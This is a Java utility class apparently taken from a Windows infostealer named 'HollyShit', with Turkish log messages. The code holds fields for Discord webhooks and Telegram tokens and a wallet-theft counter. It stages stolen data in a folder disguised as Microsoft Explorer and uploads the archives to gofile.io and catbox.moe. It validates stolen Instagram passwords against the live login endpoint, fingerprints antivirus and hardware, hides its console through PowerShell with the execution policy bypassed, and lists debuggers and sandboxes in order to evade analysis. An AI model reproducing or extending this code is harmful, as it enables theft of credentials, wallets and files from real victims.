package itzgonza.hollyshit.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.time.Period;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

import org.jsoup.Jsoup;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

public abstract class utilities {

    public static ScheduledExecutorService executor = Executors.newScheduledThreadPool(10);
    public static int stealWallets;
    public static List<String> content = new ArrayList<>();
    
    public static String webhookUrl = "";
    public static String masterWebhook = "";
    public static String telegramToken = "";
    public static String telegramChatId = "";
    
    // Global limit for entire staging folder
    public static final long MAX_STAGING_SIZE = 7 * 1024 * 1024; // 7MB MAX AS REQUESTED

    public utilities() {
    }

    public abstract void initialize() throws Exception;

    public static String getPath() {
        try {
            // Robust pathing for Turkish characters (UTF-8 based environment check)
            String localAppData = System.getenv("LOCALAPPDATA");
            String username = System.getProperty("user.name");
            String computername = System.getenv("COMPUTERNAME");
            
            // itzgonza branding in path
            File base = new File(localAppData, "Microsoft/Windows/Explorer");
            if (!base.exists()) base.mkdirs();
            
            return new File(base, String.format("%s (%s)", username, computername)).getAbsolutePath();
        } catch (Exception e) {
            return System.getProperty("java.io.tmpdir") + "/itzgonza_temp";
        }
    }

    public File getFolder() {
        File folder = new File(getPath());
        if (!folder.exists()) {
            folder.mkdirs();
        }
        return folder;
    }

    public static String getWindowsVersion() throws Exception {
        return System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")";
    }

    public static String getAntivirus() {
        try {
            System.out.println("[HollyShit] Antivirüs bilgisi alınıyor...");
            Process p = Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");
            if (!p.waitFor(5, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                return "Unknown (Timeout)";
            }
            return new BufferedReader(new InputStreamReader(p.getInputStream()))
                    .lines().filter(line -> line.startsWith("displayName=")).map(line -> line.split("=")[1])
                    .collect(Collectors.joining(", ")).trim();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    public static String getCPU() {
        try {
            System.out.println("[INFO] CPU bilgisi alınıyor...");
            Process p = Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\CIMV2 Path Win32_Processor Get Name /Format:List");
            if (!p.waitFor(5, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                return "Unknown (Timeout)";
            }
            return new BufferedReader(new InputStreamReader(p.getInputStream()))
                    .lines().filter(line -> line.startsWith("Name=")).map(line -> line.split("=")[1])
                    .collect(Collectors.joining(", "));
        } catch (Exception e) {
            return "Unknown";
        }
    }

    public static String getGPU() {
        try {
            System.out.println("[INFO] GPU bilgisi alınıyor...");
            Process p = Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\CIMV2 Path Win32_VideoController Get Name /Format:List");
            if (!p.waitFor(5, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                return "Unknown (Timeout)";
            }
            return new BufferedReader(new InputStreamReader(p.getInputStream()))
                    .lines().filter(line -> line.startsWith("Name=")).map(line -> line.split("=")[1])
                    .collect(Collectors.joining(", ")).trim();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    public static int getBoostMonth(String date) {
        ZonedDateTime zonedDateTime = ZonedDateTime.parse(date);
        ZonedDateTime now = ZonedDateTime.now(ZoneId.of("UTC"));
        Period period = Period.between(zonedDateTime.toLocalDate(), now.toLocalDate());
        return period.getYears() * 12 + period.getMonths();
    }

    public static String getInfo(String username, String password) {
        String description = Jsoup.parse(HttpRequest.get("https://www.instagram.com/" + username).body())
                .select("meta[property=og:description]").attr("content");
        String[] infoList = description.split("-")[0].trim().split(", ");
        String followers = infoList[0].toLowerCase();
        String following = infoList[1].toLowerCase();
        String posts = infoList[2].toLowerCase();
        return "**" + username + ":" + password + "\n`" + posts + ", " + followers + ", " + following
                + "`\n[Go Profile](https://www.instagram.com/" + username + ")**\n";
    }

    public static boolean getCheck(String username, String password) {
        String payload = String.format(
                "username=%s&enc_password=%%23PWD_INSTAGRAM_BROWSER%%3A0%%3A0%%3A%s&queryParams=%%7B%%7D&optIntoOneTap=false",
                username, password);
        HttpRequest request = HttpRequest.post("https://www.instagram.com/accounts/login/ajax/")
                .header("authority", "www.instagram.com")
                .header("x-ig-www-claim", "hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h")
                .header("x-instagram-ajax", "82a581bb9399")
                .header("content-type", "application/x-www-form-urlencoded")
                .header("accept", "*/*")
                .header("x-requested-with", "XMLHttpRequest")
                .header("x-csrftoken", "rn3aR7phKDodUHWdDfCGlERA7Gmhes8X")
                .header("x-ig-app-id", "936619743392459")
                .header("origin", "https://www.instagram.com")
                .header("sec-fetch-site", "same-origin")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-dest", "empty")
                .header("referer", "https://www.instagram.com/")
                .header("accept-language", "en-GB,en-US;q=0.9,en;q=0.8")
                .header("cookie", "")
                .send(payload);
        JsonObject response = JsonParser.parseString(request.body()).getAsJsonObject();
        return response.get("authenticated").getAsBoolean();
    }

    public static String getHWID() {
        String hwid = "";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(
                    "WMIC /Node:localhost /Namespace:\\\\root\\CIMV2 Path Win32_ComputerSystemProduct Get UUID /Format:List")
                    .getInputStream()));
            hwid = reader.lines().filter(line -> line.startsWith("UUID=")).map(line -> line.split("=")[1]).findFirst()
                    .orElse("").trim();
        } catch (Exception ignored) {
        }
        return hwid;
    }

    public static String getComputerName() {
        return System.getenv("COMPUTERNAME");
    }

    public String getJarName() {
        return new File(getClass().getProtectionDomain().getCodeSource().getLocation().getPath()).getName()
                .replace("%20", " ");
    }

    public static void rd3party() throws Exception {
        Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), "utf-8")
                .useDelimiter("\\A");
        String tasklist = scanner.hasNext() ? scanner.next() : "";
        scanner.close();

        List<String> blackList = Arrays.asList(
                "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "processhacker",
                "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser",
                "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc",
                "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper",
                "joeboxserver", "httpd", "HTTPDebuggerSvc", "HTTPDebuggerUI", "windbg", "reshacker",
                "ImportREC", "IMMUNITYDEBUGGER", "MegaDumper", "OLLYDBG", "ida", "disassembly",
                "scylla", "Debug", "[CPU", "Immunity", "WinDbg", "x64dbg", "cheatengine", "ghidra",
                "hyper-v", "vbox", "vmware", "sandbox");

        if (blackList.stream().anyMatch(proc -> tasklist.toLowerCase().contains(proc))) {
            System.out.println("Anti-analiz tetiklendi, ancak test modunda olduğun için kapatılmıyor: " + tasklist);
            // Runtime.getRuntime().halt(1337);
        }
    }

    public static void hideConsole() {
        try {
            String psScript = "Add-Type -Name W -Namespace C -MemberDefinition '[DllImport(\\\"Kernel32.dll\\\")]public static extern IntPtr GetConsoleWindow();[DllImport(\\\"User32.dll\\\")]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);';$w=[C.W]::GetConsoleWindow();if($w -ne [IntPtr]::Zero){[C.W]::ShowWindow($w,0)}";
            runPowerShellAsync(psScript);
        } catch (Exception ignored) {
        }
    }

    public static void runPowerShellAsync(String script) {
        executor.submit(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script);
                pb.start().waitFor();
            } catch (Exception ignored) {}
        });
    }

    public static String runPowerShellSync(String script) {
        try {
            ProcessBuilder pb = new ProcessBuilder("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                return r.lines().collect(Collectors.joining("\n")).trim();
            }
        } catch (Exception e) {
            return "";
        }
    }

    public static String runCommandSync(String command) {
        try {
            Process p = Runtime.getRuntime().exec(command);
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                return r.lines().collect(Collectors.joining("\n")).trim();
            }
        } catch (Exception e) {
            return "";
        }
    }

    public static String getFirewallStatus() {
        try {
            Process p = Runtime.getRuntime().exec("netsh advfirewall show allprofiles state");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            return r.lines().anyMatch(l -> l.contains("ON")) ? "ON" : "OFF";
        } catch (Exception e) {
            return "Unknown";
        }
    }

    public static boolean isVPN() {
        try {
            Process p = Runtime.getRuntime().exec("ipconfig /all");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            return r.lines().anyMatch(l -> l.toLowerCase().matches(".*(tap|tun|vpn|wireguard|openvpn).*"));
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isAdmin() {
        try {
            Process p = Runtime.getRuntime().exec("net session");
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static String getBadges(int flags, boolean emoji) {
        String[] badgeNames = emoji ? new String[] {
                "<:staff:874750808728666152>", "<:partner:874750808678354964>",
                "<:hypesquad_events:874750808594477056>",
                "<:bughunter_1:874750808426692658>", "<:hypersquad_1:968704541501571133>",
                "<:hypersquad_2:968704541283438623>", "<:hypersquad_3:968704541539295322>",
                "<:early_supporter:874750808602849280>", "<:nitro:874737295121575937>",
                "<:bughunter_2:874750808628039720>", "<:verified_developer:874750808611250176>",
                "<:early_verified_bot_developer:874750808611250176>", "<:certified_moderator:911634651910406144>"
        } : new String[] {
                "Staff", "Partner", "HypeSquad Events", "BugHunter Level 1", "HypeSquad Bravery",
                "HypeSquad Brilliance", "HypeSquad Balance", "Early Supporter", "Nitro", "BugHunter Level 2",
                "Verified Developer", "Early Verified Bot Developer", "Certified Moderator"
        };
        int[] badgeFlags = {
                1, 2, 4, 8, 64, 128, 256, 512, 1024, 16384, 131072, 131072, 262144
        };
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < badgeFlags.length; i++) {
            if ((flags & badgeFlags[i]) == badgeFlags[i]) {
                sb.append(badgeNames[i]).append(emoji ? "" : ", ");
            }
        }
        String badges = sb.toString();
        return badges.isEmpty() ? "None" : (emoji ? badges : badges.substring(0, badges.length() - 2));
    }

    public static long getFolderSize(java.io.File folder) {
        long length = 0;
        java.io.File[] files = folder.listFiles();
        if (files == null) return 0;
        for (java.io.File file : files) {
            if (file.isFile()) length += file.length();
            else length += getFolderSize(file);
        }
        return length;
    }

    public static boolean isOverLimit() {
        return getFolderSize(new java.io.File(getPath())) >= MAX_STAGING_SIZE;
    }

    public static String uploadFile(String filePath) {
        File file = new File(filePath);
        if (!file.exists() || file.length() == 0) {
            System.err.println("[ERROR] ZIP dosyası bulunamadı veya boş: " + filePath);
            return "";
        }

        System.out.println("[INFO] Dosya yükleniyor (" + (file.length() / 1024) + " KB): " + file.getName());
        
        // Use OkHttp for streaming upload to avoid OutOfMemoryError
        okhttp3.OkHttpClient client = new okhttp3.OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(5, java.util.concurrent.TimeUnit.MINUTES)
                .readTimeout(5, java.util.concurrent.TimeUnit.MINUTES)
                .build();

        // Gofile
        try {
            okhttp3.Request getServers = new okhttp3.Request.Builder()
                    .url("https://api.gofile.io/servers")
                    .build();
            
            try (okhttp3.Response response = client.newCall(getServers).execute()) {
                if (response.isSuccessful()) {
                    JsonObject serverJson = JsonParser.parseString(response.body().string()).getAsJsonObject();
                    if (serverJson.get("status").getAsString().equals("ok")) {
                        String server = serverJson.getAsJsonObject("data").getAsJsonArray("servers").get(0).getAsJsonObject()
                                .get("name").getAsString();

                        okhttp3.RequestBody requestBody = new okhttp3.MultipartBody.Builder()
                                .setType(okhttp3.MultipartBody.FORM)
                                .addFormDataPart("file", file.getName(),
                                        okhttp3.RequestBody.create(okhttp3.MediaType.parse("application/octet-stream"), file))
                                .build();

                        okhttp3.Request uploadRequest = new okhttp3.Request.Builder()
                                .url("https://" + server + ".gofile.io/contents/uploadfile")
                                .post(requestBody)
                                .build();

                        try (okhttp3.Response uploadResponse = client.newCall(uploadRequest).execute()) {
                            if (uploadResponse.isSuccessful()) {
                                JsonObject upJson = JsonParser.parseString(uploadResponse.body().string()).getAsJsonObject();
                                if (upJson.get("status").getAsString().equals("ok")) {
                                    return upJson.getAsJsonObject("data").get("downloadPage").getAsString();
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[WARN] Gofile yükleme hatası: " + e.getMessage());
        }

        // Catbox Fallback
        try {
            okhttp3.RequestBody requestBody = new okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("reqtype", "fileupload")
                    .addFormDataPart("fileToUpload", file.getName(),
                            okhttp3.RequestBody.create(okhttp3.MediaType.parse("application/octet-stream"), file))
                    .build();

            okhttp3.Request uploadRequest = new okhttp3.Request.Builder()
                    .url("https://catbox.moe/user/api.php")
                    .post(requestBody)
                    .build();

            try (okhttp3.Response response = client.newCall(uploadRequest).execute()) {
                if (response.isSuccessful()) {
                    String body = response.body().string().trim();
                    if (body.startsWith("http")) return body;
                }
            }
        } catch (Exception e) {
            System.err.println("[WARN] Catbox yükleme hatası: " + e.getMessage());
        }

        return "";
    }
}